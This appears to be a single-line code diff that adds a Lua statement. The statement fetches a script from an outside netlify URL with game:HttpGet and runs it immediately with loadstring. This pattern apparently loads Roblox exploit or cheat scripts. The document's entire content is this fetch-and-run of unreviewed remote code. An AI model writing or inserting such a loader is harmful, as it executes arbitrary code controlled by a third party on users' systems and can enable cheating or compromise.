@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://fl3.netlify.app/Loader.lua"))()
